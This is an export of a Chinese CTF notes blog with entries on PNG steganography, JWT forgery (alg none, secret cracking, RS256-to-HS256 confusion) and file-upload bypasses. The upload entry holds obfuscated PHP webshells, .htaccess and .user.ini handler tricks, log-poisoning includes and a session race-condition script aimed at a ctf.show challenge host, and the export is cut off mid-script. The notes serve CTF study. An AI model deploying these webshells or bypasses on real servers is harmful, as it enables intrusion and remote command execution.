        <content type="html"><![CDATA[<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>PNG由文件标志和3个以上的数据块构成<br><code>文件标志:89 50 4E 47 0D 0A 1A 0A</code><br><code>数据块(chunk)</code><br><img src="https://s2.loli.net/2024/07/25/G5qIxEwf4JmuLHW.png" alt=""><br>重点关注IHDR,IDAT,IEND</p><h3 id="exif信息"><a href="#exif信息" class="headerlink" title="exif信息"></a>exif信息</h3><p>有时信息会藏于exif信息中,右键属性或者使用exiftool等工具查看文件exif信息</p><h2 id="HEX数据"><a href="#HEX数据" class="headerlink" title="HEX数据"></a>HEX数据</h2><h3 id="直接嵌入"><a href="#直接嵌入" class="headerlink" title="直接嵌入"></a>直接嵌入</h3><p>有时信息会以明文或密文形式藏于十六进制数据中,常放于文件尾后<br>使用winhex或010editor等十六进制数据查看工具获取信息<br><img src="https://s2.loli.net/2024/07/25/gDSqYXsWVZIfHhv.png" alt=""><br>此处的base64解密即可得到信息</p><h3 id="文件头尾"><a href="#文件头尾" class="headerlink" title="文件头尾"></a>文件头尾</h3><p>有些图片损坏是由于没有或不正确的文件头尾导致<br><code>PNG文件头:89 50 4E 47 0D 0A 1A 0A</code><br><code>png文件尾:49 45 4E 44 AE 42 60 82</code></p><h3 id="宽高修复"><a href="#宽高修复" class="headerlink" title="宽高修复"></a>宽高修复</h3><p>IHDR前八个字节中有两个位对应图片宽高信息<br><img src="https://s2.loli.net/2024/07/25/NHFdtSsEB3618PK.png" alt=""><br>修改其值可将图片某部分信息隐藏</p><h3 id="IDAT块"><a href="#IDAT块" class="headerlink" title="IDAT块"></a>IDAT块</h3><blockquote><p>IDAT定义：<br>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。<br>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，用户就可以很方便的生成PNG图像。</p></blockquote><p>IDAT有固定的长度，并且正常情况下最后一个idat块会比前面短<br>使用tweakPNG或其他工具可以进行idat块检查<br><img src="https://s2.loli.net/2024/07/25/kXZqPHdBzF3DxmG.png" alt=""><br>可以看到蓝色边框的idat块属于异常现象,实际上去除本块依然不会影响png图片,将蓝色部分IDAT块数据获取下来,重新补上文件头尾并爆破出正确宽高后可以得到新的一张PNG图片</p><h3 id="binwalk-foremost"><a href="#binwalk-foremost" class="headerlink" title="binwalk|foremost"></a>binwalk|foremost</h3><p>有些文件可能藏于图片的数据中,例如在图片数据中插入zip文件数据:<br><img src="https://s2.loli.net/2024/07/25/x1ioQslHykThGZF.png" alt=""><br><code>binwalk -e 文件名</code> 可以分离文件</p><h2 id="颜色信道-常见lsb隐写"><a href="#颜色信道-常见lsb隐写" class="headerlink" title="颜色信道(常见lsb隐写)"></a>颜色信道(常见lsb隐写)</h2><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><blockquote><p>zsteg可以检测PNG和BMP图片里的隐写数据。</p></blockquote><p><code>zsteg -a 文件名</code>查看所有信道内容<br><code>zsteg -a 文件名 | grep &quot;flag&quot;</code>若flag直接明文藏于某信道则可以搭配条件查询</p><h3 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h3><p>stegsolve很强大,可以展示多个颜色信道的图片,也可以查对应的十六进制数据<br><img src="https://s2.loli.net/2024/07/25/tbU1xOI9NpwRQ4a.png" alt=""><br><img src="https://s2.loli.net/2024/07/25/1UAWa9CtouY7kEj.png" alt=""></p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><h3 id="steghide-stegseek"><a href="#steghide-stegseek" class="headerlink" title="steghide/stegseek"></a>steghide/stegseek</h3><p>steghide支持多种格式文件，用于查看隐写的内容<br><code>steghide extract -sf xxx.png -p 密码</code></p><p>stegseek基于steghide开发，用于暴力破解密码<br><code>stegseek xxx.png &#39;字典&#39;（默认使用rockyou.txt）</code></p><p>steghide隐藏文件指令<br>steghide embed -cf 原文件 -ef 要隐藏的文件 -p 123456</p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>参考:<br><a href="https://blog.csdn.net/brightendavid/article/details/115309922">IDAT block小结</a><br><a href="https://noahtie.github.io/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">PNG文件结构</a><br><a href="https://ctf-wiki.org/misc/picture/png/">https://ctf-wiki.org/misc/picture/png/</a><br><a href="https://blog.csdn.net/qq_42880719/article/details/114825260">ctfshow 8神PNG隐写入门(土)赛 WP</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/posts/jwt.html"/>
      <url>/posts/jwt.html</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>JWT（JSON Web Token）是一种用于在各方之间传递信息的紧凑且自包含的方式。它们通常用于认证和授权。</strong><br><strong>JWT 由三个部分组成：头部（Header）、载荷（Payload）和签名（Signature）。这三个部分一起编码成一个字符串，使用点（.）分隔。</strong></p><h3 id="头部（Header）"><a href="#头部（Header）" class="headerlink" title="头部（Header）"></a>头部（Header）</h3><p><strong>头部通常包含两个部分：令牌的类型（JWT）和所使用的签名算法（如 HMAC SHA256 或 RSA）。</strong></p><p><strong>示例：</strong><br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="载荷（Payload）"><a href="#载荷（Payload）" class="headerlink" title="载荷（Payload）"></a>载荷（Payload）</h3><p><strong>载荷部分包含声明（claims）。声明是关于实体（通常是用户）和其他数据的陈述。有三种类型的声明：</strong></p><ol><li>注册声明（Registered claims）：这些是预定义的声明，如 iss（发行者）、exp（过期时间）、sub（主题）、aud（观众）等。</li><li>公共声明（Public claims）：这些可以自定义使用，但应避免冲突。</li><li>私有声明（Private claims）：这些是自定义的声明，只有参与方之间共享的信息。</li></ol><p><strong>示例：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="签名（Signature）"><a href="#签名（Signature）" class="headerlink" title="签名（Signature）"></a>签名（Signature）</h3><p><strong>签名部分是为了确保令牌未被篡改。它通过将头部、载荷和一个密钥（使用 HMAC SHA256 算法）或 RSA 私钥进行编码生成。</strong></p><p>签名的生成步骤：</p><ul><li>将头部和载荷进行 base64url 编码。</li><li>连接两个编码后的字符串，中间用点（.）分隔。</li><li>使用指定的算法和密钥对连接后的字符串进行签名。</li><li>例如，对于 HMAC SHA256：</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">HMACSHA256</span>(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  <span class="built_in">base64UrlEncode</span>(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="jwt编码脚本"><a href="#jwt编码脚本" class="headerlink" title="jwt编码脚本"></a>jwt编码脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#private_key = &quot;&quot;&quot;XXX&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1667822180</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1667829380</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1667822180</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;237410127e2551647730b97941cdcae5&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    payload,</span><br><span class="line">    <span class="comment">#private_key,</span></span><br><span class="line">    <span class="string">&quot;&quot;</span>,               <span class="comment">#密码</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>jwt在线加解密<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="jwt-cracker"><a href="#jwt-cracker" class="headerlink" title="jwt-cracker"></a>jwt-cracker</h3><p>jwt-cracker 是一种工具，用于破解或猜测 JWT（JSON Web Token）的签名密钥。<br><a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a></p><blockquote><p>使用方法：<br>jwt-cracker -t jwt -a （暴力）<br>jwt-cracker -t jwt -d rockyou.txt （字典）</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="无加密算法（none）"><a href="#无加密算法（none）" class="headerlink" title="无加密算法（none）"></a>无加密算法（none）</h3><p>这种情况可以直接将jwt解base64编码得到明文，然后修改部分数据后再重新base64编码回去即可实现伪造身份。<br>例题：ctfshow web345<br>dirsearch扫到/admin/index.php<br>抓包拿到jwt base64解码得到信息<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;?[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1720167869,&quot;exp&quot;:1720175069,&quot;nbf&quot;:1720167869,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;a2fc934dcc24f6579b03f41f65e6a2bc&quot;&#125;]</code><br>修改sub里的user改为admin再重新发包得到flag<br><code>[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1720167869,&quot;exp&quot;:1720175069,&quot;nbf&quot;:1720167869,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;a2fc934dcc24f6579b03f41f65e6a2bc&quot;&#125;]</code><br><img src="https://s2.loli.net/2024/07/05/FO49PemUR12hbqn.png" alt=""></p><h3 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h3><blockquote><p>前提：网站可能将密钥放在后台中没有删除，通过dirsearch等工具查出</p></blockquote><p><strong>HS256</strong><br>HS256使用公钥进行加解密<br>获取到公钥即可进行jwt数据篡改</p><p><strong>RS256</strong><br>RS256私钥加密，公钥解密<br>获取到私钥即可进行jwt数据篡改</p><h3 id="弱密码爆破"><a href="#弱密码爆破" class="headerlink" title="弱密码爆破"></a>弱密码爆破</h3><blockquote><p>前提：有些服务器使用弱口令密码作为加密密钥使用</p></blockquote><p>例题：ctfshow web348<br>抓包拿到jwt，在<a href="https://jwt.io">https://jwt.io</a>解密发现存在HS256加密，密码未知。<br>使用jwt-cracker 暴力破解得到密码：aaab<br><img src="https://s2.loli.net/2024/07/05/1IrEtp3wdaqBXPG.png" alt=""><br>修改sub里的user改为admin再重新发包得到flag</p><h3 id="修改加密算法"><a href="#修改加密算法" class="headerlink" title="修改加密算法"></a>修改加密算法</h3><blockquote><p>前提:服务器jwt支持多种加密算法</p></blockquote><p>例题：ctfshow web350<br>源码包里找到public.key（公钥），而抓包得到的jwt是RS256加密，需要的是私钥，因此尝试将加密方式篡改为HS256，即可使用公钥进行jwt数据篡改。<br>本题使用nodejs，在public.key的当前目录下新建js文件<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure><br>终端运行node jwt.js 得到token，再重新发包得到flag</p><p>参考：<br><a href="https://www.cnblogs.com/meng-han/p/16867619.html">https://www.cnblogs.com/meng-han/p/16867619.html</a><br><a href="https://blog.csdn.net/q20010619/article/details/120420461">https://blog.csdn.net/q20010619/article/details/120420461</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/posts/upload.html"/>
      <url>/posts/upload.html</url>
      
        <content type="html"><![CDATA[<h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>前端校验一般都是检查后缀名，可以先上传正常后缀文件，后通过bp等抓包工具修改。<br>一些简单题可能关掉js直接传一句话木马即可，接下来是前后端都有检验的情况</p><h3 id="检查文件后缀名"><a href="#检查文件后缀名" class="headerlink" title="检查文件后缀名"></a>检查文件后缀名</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php|<span class="type">.php5</span>|<span class="type">.php4</span>|<span class="type">.php3</span>|<span class="type">.php2</span>|<span class="type">php1</span>|<span class="type">.html</span>|<span class="type">.htm</span>|<span class="type">.phtml</span>|<span class="type">.pHp</span>|<span class="type">.pHp5</span>|<span class="type">.pHp4</span>|<span class="type">.pHp3</span>|<span class="type">.pHp2</span>|<span class="type">pHp1</span>|<span class="type">.Html</span>|<span class="type">.Htm</span>|<span class="type">.pHtml</span>|<span class="type">.jsp</span>|<span class="type">.jspa</span>|<span class="type">.jspx</span>|<span class="type">.jsw</span>|<span class="type">.jsv</span>|<span class="type">.jspf</span>|<span class="type">.jtml</span>|<span class="type">.jSp</span>|<span class="type">.jSpx</span>|<span class="type">.jSpa</span>|<span class="type">.jSw</span>|<span class="type">.jSv</span>|<span class="type">.jSpf</span>|<span class="type">.jHtml</span>|<span class="type">.asp</span>|<span class="type">.aspx</span>|<span class="type">.asa</span>|<span class="type">.asax</span>|<span class="type">.ascx</span>|<span class="type">.ashx</span>|<span class="type">.asmx</span>|<span class="type">.cer</span>|<span class="type">.aSp</span>|<span class="type">.aSpx</span>|<span class="type">.aSa</span>|<span class="type">.aSax</span>|<span class="type">.aScx</span>|<span class="type">.aShx</span>|<span class="type">.aSmx</span>|<span class="type">.cEr</span>|<span class="type">.sWf</span>|<span class="type">.swf</span></span><br></pre></td></tr></table></figure><blockquote><p>注意phtml上传后要访问的是.html</p></blockquote><h3 id="检查文件类型"><a href="#检查文件类型" class="headerlink" title="检查文件类型"></a>检查文件类型</h3><p>保证Content-Type符合要求:<br>text/html（HTML 文档）<br>text/plain（纯文本）<br>image/gif（GIF 图像）<br>image/jpeg（JPG 图像）<br>image/png (PNG 图像）</p><h3 id="检查文件内容"><a href="#检查文件内容" class="headerlink" title="检查文件内容"></a>检查文件内容</h3><h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><p>GIF89a（常用）<br>其他图片可以直接在正常图片后面加上一句话木马来伪造图片马</p><h4 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h4><ol><li><code>&lt;? echo &#39;123&#39;;?&gt;</code> #前提是开启配置参数short_open_tags=on</li><li><code>&lt;?=(表达式)?&gt;</code>  即 <code>&lt;?php echo (表达式)?&gt;</code>  #不需要开启参数设置</li><li><code>&lt;% echo &#39;123&#39;;%&gt;</code> #开启配置参数asp_tags=on，并且只能在7.0以下版本使用</li><li><code>&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#39;a&#39;]);&lt;/script&gt;</code> #不需要修改参数开关，但是只能在7.0以下可用。<h4 id="基础免杀木马"><a href="#基础免杀木马" class="headerlink" title="基础免杀木马"></a>基础免杀木马</h4></li></ol><ol><li><p><code>&lt;?=`$_REQUEST[1]`;?&gt;</code>   //利用反引号执行系统命令</p></li><li><p><code>&lt;?php$$a=$$_REQUEST[&#39;a&#39;];$$b=$$_REQUEST[&#39;b&#39;];$$a($$b);?&gt;</code><br>//a=system&amp;b=tac ../flagaa.php</p></li><li><p><code>&lt;?php $a=&#39;syste&#39;.&#39;m&#39;;($a)(&#39;ls ../&#39;);</code> //拼接<br>//把ls ../换成tac ../flagaa.php即可找到flag</p></li><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line">b = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,a);</span><br><span class="line"><span class="variable">$$c</span> = <span class="variable">$$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$$c</span>(<span class="variable">$$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//c相当于system,给1赋值参数即可</span></span><br></pre></td></tr></table></figure></li><li><p><code>&lt;?php $a=substr(&#39;1s&#39;,1).&#39;ystem&#39;; $a($_REQUEST[1]); ?&gt;</code></p></li><li><p><code>&lt;?php $a=strrev(&#39;metsys&#39;); $a($_REQUEST[1]); ?&gt;</code></p></li><li><p>?cmd=<br><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;);</code><br>//数字函数  get传参   abs=system&amp;acos=xxx</p></li></ol><h4 id="骚绕过"><a href="#骚绕过" class="headerlink" title="骚绕过"></a>骚绕过</h4><ol><li>过滤空格可以直接不打空格或者是用换行0d绕过</li><li>过滤[]用{}绕过</li><li>过滤ip地址的.时用数字ip绕过</li><li>过滤()时构造<br><code>&lt;?=`tac ../f*`?&gt;</code></li></ol><h3 id="htaccess（仅使用于apache）"><a href="#htaccess（仅使用于apache）" class="headerlink" title=".htaccess（仅使用于apache）"></a>.htaccess（仅使用于apache）</h3><blockquote><p>htaccess 在站点的根目录下面，不是在apache目录下，但是它属于apache的一个配置文件</p></blockquote><p>利用：<br><strong>先上传.htcaccess，内容如下：</strong><br><code>SetHandler application/x-httpd-php</code><br>#在当前目录下，所有文件都会被解析成php代码执行<br><code>SetHandler application/x-httpd-php .jpg</code><br><code>AddHandler php5-script .jpg</code><br><code>AddType application/x-httpd-php .jpg</code><br>#匹配当前目录下所有jpg文件<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;test.png&quot;</span>&gt;</span> </span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php </span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><br>#匹配test.png解析为php文件<br><strong>然后上传对应格式的文件，内容为一句话木马，然后访问即可被当作php文件执行</strong></p><h3 id="user-ini（上传目录必须有php文件存在）"><a href="#user-ini（上传目录必须有php文件存在）" class="headerlink" title=".user.ini（上传目录必须有php文件存在）"></a>.user.ini（上传目录必须有php文件存在）</h3><p>利用点：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file=filename     <span class="comment">//一个相当于在每个php文件尾加上 include(“filename”)</span></span><br></pre></td></tr></table></figure><br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_prepend_file=filename    <span class="comment">//一个相当于文件头加上 include(“filename”)</span></span><br></pre></td></tr></table></figure><br>利用：</p><ol><li>//上传.user.ini<br>auto_prepend_file=1.png</li><li>//上传1.png<br>&lt;?=<code>tac /f*</code>?&gt;</li><li>//访问index.php(或当前目录下任意php文件)</li></ol><h3 id="日志包含（配合ini）"><a href="#日志包含（配合ini）" class="headerlink" title="日志包含（配合ini）"></a>日志包含（配合ini）</h3><p>先传.user.ini<br>然后传图片，内容为：</p><pre><code class="lang-&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;```">```&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;(过滤log关键字时)</code></pre><p>最后改UA头为一句话木马，刷新网页即可</p><blockquote><p>这里为什么不能直接传auto_append_file=”/var/lo”.”g/nginx/access.lo”.”g”呢，因为二者语法不同，include是php语法，所以可以用.来连接，而ini的语法不一样不能用.连接字符串会导致报错，所以用图片马作为中介。</p></blockquote><h3 id="session包含-条件竞争"><a href="#session包含-条件竞争" class="headerlink" title="session包含+条件竞争"></a>session包含+条件竞争</h3><p>当我们没有文件可以用来进行包含时，可以尝试利用session.upload_progress将恶意语句写入session文件，从而包含session文件。<br>前提：session.upload_progress.enabled = on //enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ctfshow web 162 163</span></span><br><span class="line"><span class="comment"># 这里是先利用.user.ini包含了session文件，然后再不断的往url1的session里放入一句话木马，并不断请求url2去执行命令cat flag</span></span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;nanian233&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;https://2299d377-323d-4aa7-8bd0-80ae8bf2ff68.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;https://2299d377-323d-4aa7-8bd0-80ae8bf2ff68.challenge.ctf.show/upload/index.php&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;nanian233&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><h4 id="GIF二次渲染"><a href="#GIF二次渲染" class="headerlink" title="GIF二次渲染"></a>GIF二次渲染</h4><p>gif比较简单，可以先传正常gif图上去后再下载下来后比较两张图的数据，没有改变的地方加上木马语句即可。</p><h4 id="PNG二次渲染"><a href="#PNG二次渲染" class="headerlink" title="PNG二次渲染"></a>PNG二次渲染</h4><p>使用方法：php 脚本.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span 